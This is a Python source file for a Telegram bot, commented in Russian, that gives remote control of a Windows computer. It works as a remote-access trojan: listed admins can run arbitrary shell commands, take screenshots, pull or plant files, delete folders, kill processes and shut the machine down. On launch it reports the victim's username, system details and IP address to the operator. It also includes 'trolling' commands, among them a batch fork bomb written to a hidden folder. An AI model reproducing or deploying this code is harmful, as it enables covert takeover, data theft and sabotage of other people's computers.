import os, logging, pyautogui, asyncio, keyboard, psutil

from aiogram import Dispatcher, Bot, types
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from shutil import rmtree
from ctypes import windll
from random import randint
from pygetwindow import getActiveWindowTitle
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness

from machine import WindowsMachine
from sound import Sound
from binds import bindAPI


TOKEN = ""  # Токен бота из BotFather
ADMINS = [1215122907]  # Список администраторов бота
BINDS_ROUTE = r'binds'  # Путь до папки с биндами
LOGGING = True  # Включить логгирование в консоли всех, кто пытается использовать бота (True - логировать / False - нет)

# FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s", "ctrl+shift+esc"]  # Быстрые клавиши (используются в меню клавиш) (временно не работает)
# FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (используются при вводе команд) (временно не работает)
TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)

VERSION = '4.0'  # Версия бота
COMMAND_LIST = {
    'start': 'список команд бота',
    'console': 'отправить команду в консоль',
    'screen': 'сделать скриншот',
    'open_site': 'открыть сайт',
    'create_error': 'создать ошибку',
    'processes': 'получить список процессов',
    'kill_process': 'убить процесс',
    'reboot': 'перезапустить компьютер',
    'off_pc': 'выключить компьютер',
    'logout': 'выйти из текущей учетной записи',
    'setvolume': 'установить громкость',
    'setbright': 'установить яркость',
    'pc_info': 'получить информацию о ПК',
    'create_file': 'создать файл',
    'create_folder': 'создать папку',
    'delete_file': 'удалить файл',
    'delete_folder': 'удалить папку',
    'change_file': 'изменить содержимое файла',
    'clean_file': 'очистить содержимое файла',
    'download_on': 'выгрузить файл НА компьютер',
    'download_from': 'загрузить файл С компьютера',
    'write': 'напечатать текст как с клавиатуры',
    'hotkey': 'использовать горячие клавиши как с клавиатуры',
    'fork_troll': 'троллинг "Fork Bomb" (start %0 %0)',
    'mouse_troll': 'троллинг перемещением мышки',
    'explorer_troll': 'троллинг массовым открытием проводника',
    'web_troll': 'троллинг массовым открытием сайтов',
    'bind_list': 'получить список с биндами',
    'bind_create': 'создать бинд',
    'bind_del': 'удалить бинд',
    'bind_read': 'начать выполнение бинда'
}

GB = 10 ** 9
pyautogui.FAILSAFE = False
logging.basicConfig(level=logging.INFO)

class ControlStates(StatesGroup):
    ERROR_SET_BODY = State()
    FILE_SET_NEW_CONTENT = State()
    BIND_CREATE_CODE = State()

bot = Bot(TOKEN)
dp = Dispatcher()
device = WindowsMachine(bot)
sound = Sound()

def make_temp_folder() -> bool:
    os.mkdir(r'C:\temp')
    kernel32 = windll.kernel32
    kernel32.SetFileAttributesW(r'C:\temp', kernel32.GetFileAttributesW(r'C:\temp') | 2)
    return True

async def is_access(user: types.User) -> bool:
    if LOGGING: print(user.id, user.username, user.first_name, sep='|')
    ADMINS.append((await bot.get_me()).id)

    return user.id in ADMINS

def upload_file(file: str, filename: str | None = None):
    return types.FSInputFile(file, filename)

# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

@dp.message(CommandStart(ignore_case=True))
async def start_cmd(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    commands_string = ""
    for i in COMMAND_LIST:
        commands_string += f"\n/{i} - {COMMAND_LIST[i]}"

    await state.clear()
    return await message.reply(F"👋 Добро пожаловать! Вот список команд:\n{commands_string}")


@dp.message(Command('console_cmd', 'cmd_console', 'console'))
async def console_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /console_cmd <команда>")
    
    message_ = await message.reply("Команда выполняется, ожидайте результата...")
    output = await device.console_cmd(command.args.strip())
    await message_.delete()
    if len(output) > 999:
        if not os.path.exists(r'C:\temp'): make_temp_folder()

        with open(r'C:\temp\ConsoleOutput.txt', 'w+', encoding='utf-8') as f:
            f.write(output)

        await message.reply_document(document=upload_file(r'C:\temp\ConsoleOutput.txt'), caption=f'☑️ Команда *{command.args.strip()}* успешно выполнена\n\nОтвет от консоли оказался *слишком длинным* и был *сохранен в файл*!', parse_mode="Markdown")
        return os.remove(r'C:\temp\ConsoleOutput.txt')
    
    return await message.reply(f"☑️ Команда *{message.text.strip()}* успешно выполнена\n\n📡 Ответ от консоли:\n{output}", parse_mode="Markdown")


@dp.message(Command('screen', 'screenshot'))
async def screenshot_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    screenshots = await device.screenshot()
    upload_files = [types.InputMediaPhoto(media=upload_file(i)) for i in screenshots]
    await message.reply_media_group(upload_files)
    for screen in screenshots:
        os.remove(screen)


@dp.message(Command("open_site", "open_web"))
async def open_site_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /open_site <ссылка>")
    
    webopen(command.args.strip(), 2)
    return await message.reply(f'☑️ *Вы успешно открыли {command.args.strip()}*', parse_mode='Markdown')


# /////// CREATE ERROR SYSTEM BEGIN ///////
@dp.message(Command("create_error", "error"))
async def create_error_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /error <заголовок ошибки>")
    
    await message.reply("✏️ Отправьте следующим сообщением текст (тело) ошибки. Для отмены введите /start")

    await state.set_data({'title': command.args.strip()})
    await state.set_state(ControlStates.ERROR_SET_BODY)


@dp.message(ControlStates.ERROR_SET_BODY)
async def create_error_cmd_body(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    if '/start' in message.text.strip():
        await message.reply("😫 Вы отменили создание ошибки!")
        return await state.clear()
    
    title = (await state.get_data())['title']
    await state.clear()
    await message.reply('❗️ *Ошибка успешно создана!*', parse_mode='Markdown')
    return windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)
# /////// CREATE ERROR SYSTEM END ///////


@dp.message(Command('processes', 'process_list'))
async def process_list_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    processes = 'Список процессов:\n\n'
    for i in psutil.pids():
        try: processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'    
        except: continue

    with open("processes.txt", "w+", encoding="utf-8") as file:
        file.write(processes)

    await message.reply_document(upload_file("processes.txt"), caption='☑️ Cписок процессов был *сохранен в файл ниже*!\n\nВведите *ID процесса* для уничтожения или *нажмите на кнопку "Назад"*', parse_mode="Markdown")
    return os.remove("processes.txt")


@dp.message(Command("kill_process", "kprocess"))
async def kill_process_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /kill_process <id процесса>")

    elif not command.args.strip().isdigit():
        return await message.reply("❌ *Произошла ошибка! ID процесса должно быть числом*", parse_mode='Markdown')
    
    kill_id = int(command.args.strip())
    parent = psutil.Process(kill_id)

    try:
        for child in parent.children(recursive=True): child.kill()
        parent.kill()
        
    except psutil.NoSuchProcess: return await message.reply( '❌ *Произошла ошибка! Процесса с таким ID не существует*', parse_mode='Markdown')
    except psutil.AccessDenied: return await message.reply('❌ *Произошла ошибка! Для уничтожения данного процесса недостаточно прав*', parse_mode='Markdown')
    finally: return await message.reply(f'☑️ Процесс с ID *{kill_id}* был успешно уничтожен!', parse_mode='Markdown')


@dp.message(Command("reboot", "restart"))
async def reboot_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("☑️ *Вы успешно вызвали перезагрузку ПК*!", parse_mode='Markdown')
    return await device.console_cmd("shutdown -r -t 0")

@dp.message(Command("off_pc", "pc_off"))
async def pc_off_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("☑️ *Вы успешно вызвали выключение ПК*!")
    return await device.console_cmd("shutdown /s /t 0")

@dp.message(Command("logout"))
async def logout_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("☑️ Вы успешно вызывали выход из учетной записи!")
    return await device.console_cmd("shutdown /l")


@dp.message(Command("setvolume", "volume"))
async def setvolume_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply(f"🔧 Текущий уровень громкости - *{Sound.current_volume()}*\nДля его изменения используйте: /setvolume <0-100>", parse_mode='Markdown')
    
    level = command.args.strip()
    if not level.isdigit():
        return await message.reply("❌ *Уровень грокмоксти должен быть числом!*", parse_mode='Markdown')
    
    elif int(level) < 0 or int(level) > 100:
        return await message.reply("❌ *Уровень громкости должен быть меньше 0 или больше 100!*", parse_mode='Markdown')
    
    await sound.volume_set(int(level))
    return await message.reply(f"✅ Вы успешно установили уровень громкости *{level}*!", parse_mode='Markdown')


@dp.message(Command("setbright", "bright"))
async def setbright_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply(f"🔧 Текущий уровень яркости - *{get_brightness()[0]}*\nДля его изменения используйте: /setbright <0-100>", parse_mode='Markdown')
    
    level = command.args.strip()
    if not level.isdigit():
        return await message.reply("❌ *Уровень яркости должен быть числом!*", parse_mode='Markdown')
    
    elif int(level) < 0 or int(level) > 100:
        return await message.reply("❌ *Уровень яркости должен быть меньше 0 или больше 100!*", parse_mode='Markdown')
    
    set_brightness(int(level))
    return await message.reply(f"✅ Вы успешно установили уровень яркости *{level}*!", parse_mode='Markdown')


@dp.message(Command("pc_info", "info_pc"))
async def pc_info(message: types.Message):
    if not await is_access(message.from_user): return

    message_ = await message.reply("😣 Идет сбор данных, ожидайте...")

    await device.update()
    active_window = getActiveWindowTitle()
    if active_window is None or active_window == '':
        active_window = 'Рабочий стол'

    message_text = (f"📌 Текущие показатели ПК\n\n"
           f"💾 Имя пользователя - *{device.login}*\n🪑 Операционная система - *{device.oper[0]} {device.oper[2]} {device.oper[3]}*\n"
           f"🧮 Процессор - *{device.oper[5]}*\n😻 Оперативная память: *Доступно {int(device.virtual_memory[0] / 1e+9)} ГБ | Загружено {device.virtual_memory[2]}%*\n"
           f"🔋 Батарея заряжена на *{device.battery}*\n🖥 Разрешение экрана - *{device.width}x{device.height}*\n"
           f"📀 Память: *{device.total_mem/GB:.2f}* ГБ всего, осталось *{device.free_mem/GB:.2f}* ГБ\n"
           f"🔑 IP адрес запустившего - *{device.ip['ip']}*\n"
           f"🖼 Активное окно - *{active_window}*")
    
    await message_.delete()
    return await message.reply(message_text, parse_mode='Markdown')


@dp.message(Command("create_file", "file_create"))
async def create_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /create_file <название/путь до файла>")
    
    with open(command.args.strip(), 'w+'):
        pass

    return await message.reply(f"☑️ Файл *{command.args.strip()}* успешно создан!", parse_mode="Markdown")


@dp.message(Command("create_folder", "folder_create"))
async def create_folder_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /create_folder <название/путь до папки>")
    
    try: os.mkdir(command.args.strip())
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при создании папки: {e}")
    finally: return await message.reply(f"*☑️ Папка по пути *{command.args.strip()}* была успешно создана!*", parse_mode='Markdown')


@dp.message(Command("delete_file", "delfile"))
async def delete_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /delete_file <название/путь до файла>")
    
    try: os.remove(command.args.strip())
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при удалении файла: {e}")
    finally: return await message.reply(f"*☑️ Файл по пути *{command.args.strip()}* был успешно удалён!*", parse_mode='Markdown')


@dp.message(Command("delete_folder", "delfolder"))
async def delete_folder_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /delete_folder <путь до папки>")
    
    try: rmtree(command.args.strip())
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при удалении папки: {e}")
    finally: return await message.reply(f"*☑️ Папка по пути *{command.args.strip()}* была успешно удалена!*", parse_mode='Markdown')


# /////// CHANGE FILE SYSTEM BEGIN ///////
@dp.message(Command("change_file", "file_change"))
async def change_file_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /change_file <путь до файла>")
    
    if not os.path.exists(command.args.strip()):
        return await message.reply("❌ Указанного файла не существует!")
    
    await state.set_state(ControlStates.FILE_SET_NEW_CONTENT)
    await state.set_data({'path': command.args.strip()})
    return await message.reply("✍️ *Укажите новое содержимое!*", parse_mode="Markdown")

@dp.message(ControlStates.FILE_SET_NEW_CONTENT)
async def change_file_finish(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    route = (await state.get_data())['path']
    await state.clear()
    try:
        with open(route, 'w+') as f:
            f.write(message.text.strip())
    
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при изменении файла: {e}")
    finally: return await message.reply(f"☑️ Файл *{route}* был успешно изменен!", parse_mode='Markdown')
# /////// CHANGE FILE SYSTEM END ///////


@dp.message(Command("clean_file", "file_clean"))
async def clean_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /change_file <путь до файла>")
    
    if not os.path.exists(command.args.strip()):
        return await message.reply("❌ Указанного файла не существует!")
    
    try:
        with open(command.args.strip(), 'w+') as f:
            f.write("")
    
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при очистке файла: {e}")
    finally: return await message.reply(f"☑️ Файл *{command.args.strip()}* был успешно очищен!", parse_mode='Markdown')


@dp.message(Command("download_on"))
async def download_on_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /download_on <путь до места выгрузки>")
    
    if message.document is None:
        return await message.reply("⚠️ Неверное использование команды! Прикладывайте файл вместе с командой")
    
    try: await bot.download_file((await bot.get_file(message.document.file_id)).file_path, command.args.strip())
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при выгрузке файла: {e}")
    finally: return await message.reply(f"☑️ Файл успешно сохранен по пути *{command.args.strip()}*!", parse_mode='Markdown')


@dp.message(Command('download_from'))
async def download_from_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /download_from <путь до места загрузки>")
    
    if not os.path.exists(command.args.strip()):
        return await message.reply("❌ Указанного файла не существует!")
    
    try: await message.reply_document(upload_file(command.args.strip()))
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при скачивании файла: {e}")
    finally: return await message.reply(f"☑️ Файл *{command.args.strip()}* успешно сохранен!", parse_mode='Markdown')


@dp.message(Command('write'))
async def write_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /write <текст>")
    
    await keyboard.write(command.args.strip(), delay=0.2)
    await message.reply(f"✅ Текст *{command.args.strip()}* успешно набран!", parse_mode='Markdown')


@dp.message(Command('hotkey'))
async def hotkey_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /hotkey <сочетание клавиш (например alt+f4)>")
    
    try: keyboard.send(command.args.strip())
    except Exception as e: return await message.reply(f"⛔️ Произошла ошибка при нажатии hotkey: {e}")
    finally: await message.reply(f"☑️ Комбинация *{command.args.strip()}* успешно выполнена!", parse_mode='Markdown')


@dp.message(Command("fork_troll"))
async def fork_troll_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    if not os.path.exists(r'C:\temp'):
        make_temp_folder()

    with open('C:\\temp\\troll.bat', 'w+') as f:
        f.write('start %0 %0')

    await message.reply("☑️ Троллинг *start %0 %0 успешно запущен!*", parse_mode='Markdown')
    return await device.console_cmd('C:\\temp\\troll.bat')


@dp.message(Command('mouse_troll'))
async def mouse_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /mouse_troll <кол-во секунд>")
    
    if not command.args.strip().isdigit():
        return await message.reply("⚠️ *Количество раз должно быть числом!*", parse_mode='Markdown')
    
    await device.update()
    await message.reply(f"📡 Скрипт начал выполнение *{command.args.strip()}* секунд, ожидайте...", parse_mode='Markdown')
    for i in range(int(command.args.strip())): 
        for i in range(10):
            pyautogui.moveTo(randint(0, device.width), randint(0, device.height), duration=0.10)

    return await message.reply("☑️ *Скрипт на перемещение мышки успешно выполнился!*", parse_mode='Markdown')


@dp.message(Command("explorer_troll", "exp_troll"))
async def explorer_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /explorer_troll <кол-во раз>")

    if not command.args.strip().isdigit():
        return await message.reply("⚠️ *Количество раз должно быть числом!*", parse_mode='Markdown')
    
    await message.reply(f"📡 *Скрипт успешно начал выполняться {command.args.strip()} раз!*", parse_mode='Markdown')
    for i in range(int(command.args.strip())):
        keyboard.send("win+e")

    await message.reply("☑️ *Скрипт на открытие проводника успешно выполнился!*", parse_mode='Markdown')


@dp.message(Command("web_troll"))
async def web_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /web_troll <кол-во раз>")

    if not command.args.strip().isdigit():
        return await message.reply("⚠️ *Количество раз должно быть числом!*", parse_mode='Markdown')
    
    await message.reply(f"📡 *Скрипт успешно начал выполняться {command.args.strip()} раз!*", parse_mode='Markdown')
    for i in range(int(command.args.strip())):
        for site in TROLL_WEBSITES:
            webopen(site, new=2)

    return await message.reply("☑️ *Скрипт на открытие сайтов успешно выполнился!*", parse_mode='Markdown')


@dp.message(Command("bind_list"))
async def bind_list_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    files_list = []
    for (root, dirs, files) in os.walk(BINDS_ROUTE, topdown=True):
        files_list = files.copy()

        for file in files_list:
            files_list.remove(file)
            if not file.endswith('.bind'):
                continue
            
            files_list.append(file.strip('.bind'))
    

    if len(files_list) > 0:
        return await message.reply(f'📌 Список биндов в папке {BINDS_ROUTE}:\n' + "\n".join(files_list))

    return await message.reply("😭 Увы, нет ни одного бинда. Вы можете создать его командой /bind_create")


@dp.message(Command("bind_del", "bind_delete"))
async def bind_del_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /bind_del <название бинда без .bind>")
    
    if not os.path.exists(f"{BINDS_ROUTE}\\{command.args}.bind"):
        return await message.reply("⚠️ Данного бинда не существует")
    
    os.remove(f"{BINDS_ROUTE}\\{command.args}.bind")
    return await message.reply(f"😎 Бинд {command.args} успешно удалён!")

# /////// CREATE BIND SYSTEM BEGIN ///////
@dp.message(Command("bind_create", "create_bind"))
async def bind_create_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /bind_create <название бинда без .bind>")
    
    await state.set_data({'title': command.args.strip()})
    await state.set_state(ControlStates.BIND_CREATE_CODE)
    return await message.reply("😏 Введите код бинда")

@dp.message(ControlStates.BIND_CREATE_CODE)
async def bind_create_cmd_(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    title = (await state.get_data())['title']
    try:
        with open(f"{BINDS_ROUTE}\\{title}.bind", 'w+') as f:
            f.write(message.text)
    
    except Exception as e: await message.reply(f"⛔️ При создании бинда возникла ошибка: {e}")
    finally: return await message.reply(f"😮 Бинд *{title}* успешно создан!", parse_mode='Markdown')
# /////// CREATE BIND SYSTEM END ///////

@dp.message(Command("bind_read"))
async def bind_read_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("⚠️ Неверное использование команды! Используйте: /bind_read <название бинда без .bind>")
    
    if not os.path.exists(f"{BINDS_ROUTE}\\{command.args}.bind"):
        return await message.reply("⚠️ Данного бинда не существует")
    
    await message.reply(f"😇 Запускаю бинд {command.args.strip()}!")

    with open(f"{BINDS_ROUTE}\\{command.args.strip()}.bind", "r", encoding='utf8') as file:
        code = file.read().split("\n")

    bind_api = bindAPI(message.bot, message.from_user)

    for i in code:
        try:
            if i.startswith('//') or len(i.strip()) <= 0: continue

            elif i.startswith('wait'): 
                if await bind_api.setWait(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('writeKeyboard'):
                if await bind_api.writeKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('useKeyboard'):
                if await bind_api.useKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('openSite'):
                if await bind_api.openSite(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('sendScreenshot'):
                if await bind_api.sendScreenshot(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('openProgram'):
                if await bind_api.useConsole(0, i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('clickMouse'):
                if await bind_api.clickMouse(i.split('=', maxsplit=1)[1]) is not None: break
            
            elif i.startswith('setCursor'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.setCursor(int(funcCode[0]), int(funcCode[1])) is not None: break

            elif i.startswith('sendMessage'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.sendMessage(int(funcCode[0]), funcCode[1]) is not None: break

            elif i.startswith('useConsole'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.useConsole(int(funcCode[0]), funcCode[1]) is not None: break

            else:
                return await message.reply(f"⚠️ Произошла ошибка во время выполнения: Данной функции не существует!\n{i}")

        except IndexError: return await message.reply(f"⚠️ Произошла ошибка во время выполнения: Проверьте аргументы строки!\n{i}")

    return await message.reply("✅ Бинд успешно выполнен")

async def main():
    startup_time = datetime.now()
    await device.update()

    if not os.path.exists(r'C:\temp'): make_temp_folder()
    if not os.path.exists(BINDS_ROUTE): os.mkdir(BINDS_ROUTE)
    
    await bot.set_my_commands([
        types.BotCommand(command=i, description=COMMAND_LIST[i]) for i in COMMAND_LIST
    ])

    message = (f"🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n"
           f"💾 Имя пользователя - *{device.login}*\n🪑 Операционная система - *{device.oper[0]} {device.oper[2]} {device.oper[3]}*\n"
           f"🧮 Процессор - *{device.oper[5]}*\n😻 Оперативная память: *Доступно {int(device.virtual_memory[0] / 1e+9)} ГБ | Загружено {device.virtual_memory[2]}%*\n"
           f"🔋 Батарея заряжена на *{device.battery}*\n🖥 Разрешение экрана - *{device.width}x{device.height}*\n"
           f"📀 Память: *{device.total_mem/GB:.2f}* ГБ всего, осталось *{device.free_mem/GB:.2f}* ГБ\n"
           f"🔑 IP адрес запустившего - *{device.ip['ip']}*")
    
    for admin in ADMINS:
        try: await bot.send_message(admin, message, parse_mode='Markdown')
        except: continue

    print(f"{startup_time} | Управление компьютером v.{VERSION} успешно запущено!")
    return await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
